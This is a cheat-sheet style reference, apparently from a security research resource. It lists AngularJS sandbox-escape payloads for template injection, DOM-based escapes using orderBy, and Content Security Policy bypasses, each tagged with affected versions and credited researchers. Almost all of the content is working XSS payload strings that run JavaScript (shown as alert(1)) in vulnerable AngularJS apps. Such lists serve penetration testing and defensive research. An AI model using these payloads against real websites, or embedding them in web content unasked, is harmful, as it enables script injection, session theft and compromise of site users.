# AngularJS Sandbox Escapes and CSP Bypasses

## AngularJS Sandbox Escapes

| **Version**              | **Author**                         | **Length** | **Payload**                                                                                                                                                                                                                                                                                                                                                                             | **Vector**               |
|--------------------------|------------------------------------|------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------|
| 1.0.1 - 1.1.5           | Mario Heiderich (Cure53)            | 41         | `{{constructor.constructor('alert(1)')()}}`                                                                                                                                                                                                                                                                                                                                            | Jump to the code         |
| 1.0.1 - 1.1.5 (shorter) | Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys) | 33         | `{{$on.constructor('alert(1)')()}}`                                                                                                                                                                                                                                                                                                                                                   | Jump to the code         |
| 1.2.0 - 1.2.1           | Jann Horn (Google)                 | 122        | `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}`                                                                                                                                                                                                                                                             | Jump to the code         |
| 1.2.2 - 1.2.5           | Gareth Heyes (PortSwigger)          | 23         | `{{{}.")));alert(1)//"}}`                                                                                                                                                                                                                                                                                                                                                               | Jump to the code         |
| 1.2.6 - 1.2.18          | Jan Horn (Google)                  | 106        | `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}`                                                                                                                                                                                                                                                                           | Jump to the code         |
| 1.2.19 - 1.2.23         | Mathias Karlsson (Detectify)       | 124        | `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}`                                                                                                                                                                                                                                                          | Jump to the code         |
| 1.2.24 - 1.2.29         | Gareth Heyes (PortSwigger)          | 23         | `{{{}.")));alert(1)//"}}`                                                                                                                                                                                                                                                                                                                                                               | Jump to the code         |
| 1.2.27-1.2.29/1.3.0-1.3.20 | Gareth Heyes (PortSwigger)      | 23         | `{{{}.")));alert(1)//"}}`                                                                                                                                                                                                                                                                                                                                                               | Jump to the code         |
| 1.3.0                    | Gábor Molnár (Google)              | 272        | `{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}}`                                                                                      | Jump to the code         |
| 1.3.3 - 1.3.18           | Gareth Heyes (PortSwigger)          | 128        | `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}`                                                                                                                                                                                                                                                        | Jump to the code         |
| 1.3.19                   | Gareth Heyes (PortSwigger)          | 102        | `{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}`                                                                                                                                                                                                                                                                               | Jump to the code         |
| 1.3.20                   | Gareth Heyes (PortSwigger)          | 65         | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}`                                                                                                                                                                                                                                                                                                                    | Jump to the code         |
| 1.4.0 - 1.4.9           | Gareth Heyes (PortSwigger)          | 74         | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`                                                                                                                                                                                                                                 | Jump to the code         |
| 1.5.0 - 1.5.8           | Ian Hickey & Gareth Heyes (PortSwigger) | 79         | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`                                                                                                                                                                                                                                                                                                  | Jump to the code         |
| 1.5.9 - 1.5.11          | Jann Horn (Google)                 | 517        | `{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}` | Jump to the code         |
| 1.5.9 - 1.5.11 (shorter) | Jann Horn (Google) & Lukasz Plonka | 326        | `{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}` | Jump to the code         |
| >=1.6.0                  | Mario Heiderich (Cure53)            | 41         | `{{constructor.constructor('alert(1)')()}}`                                                                                                                                                                                                                                                                                                                                            | Jump to the code         |
| >=1.6.0 (shorter)        | Gareth Heyes (PortSwigger) & Lewis Ardern (Synopsys) | 33         | `{{$on.constructor('alert(1)')()}}`                                                                                                                                                                                                                                                                                                                                                   | Jump to the code         |

## DOM-based AngularJS Sandbox Escapes (Using `orderBy` or no `$eval`)

| **Version**              | **Author**                         | **Length** | **Payload**                                                                                                                                                                                                                      | **Vector**               |
|--------------------------|------------------------------------|------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------|
| 1.0.1 - 1.1.5           | Mario Heiderich (Cure53)            | 37         | `constructor.constructor('alert(1)')()`                                                                                                                                                                                             | Jump to the code         |
| 1.2.0 - 1.2.18          | Jann Horn (Google)                 | 118        | `a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()`                                                                                                          | Jump to the code         |
| 1.2.19 - 1.2.23         | Mathias Karlsson (Detectify)       | 119        | `toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)`                                                                                                         | Jump to the code         |
| 1.2.24 - 1.2.26         | Gareth Heyes (PortSwigger)          | 317        | `{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()` | Jump to the code         |
| 1.2.27-1.2.29/1.3.0-1.3.20 | Gareth Heyes (PortSwigger)       | 20         | `{}.")));alert(1)//";`                                                                                                                                                                                                            | Jump to the code         |
| 1.4.0-1.4.5             | Gareth Heyes (PortSwigger)          | 75         | `'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';`                                                                                                                                                   | Jump to the code         |
| 1.4.2-1.5.8             | Gareth Heyes (PortSwigger) & Daniel Kachakil (Anvil Ventures) | 70         | `{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'`                                                                                                                                                       | Jump to the code         |
| >=1.6.0                  | Mario Heiderich (Cure53)            | 37         | `constructor.constructor('alert(1)')()`                                                                                                                                                                                             | Jump to the code         |
| 1.4.4 (without strings) | Gareth Heyes (PortSwigger)          | 134        | `toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`                                                                                         | Jump to the code         |

## AngularJS CSP Bypasses

| **Version**              | **Author**                         | **Length** | **Payload**                                                                                                                                                                                                                     | **Vector**               |
|--------------------------|------------------------------------|------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------|
| All versions (all browsers) using `from` | Gareth Heyes (PortSwigger)      | 91         | `<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`                                                                                                                               | Jump to the code         |
| All versions (all browsers) shorter using assignment | Gareth Heyes (PortSwigger) | 66         | `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>`                                                                                                                                                      | Jump to the code         |
| All versions (all browsers) shorter       | Gareth Heyes (PortSwigger)      | 91         | `<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`                                                                                                                               | Jump to the code         |
| 1.2.0 - 1.5.0            | Eduardo Vela (Google)              | 190        | `<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>` | Jump to the code         |
| All versions (all browsers) shorter via `oncut` | Savan Gadhiya (NotSoSecure) | 59         | `<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>`                                                                                                                                                             | Jump to the code         |
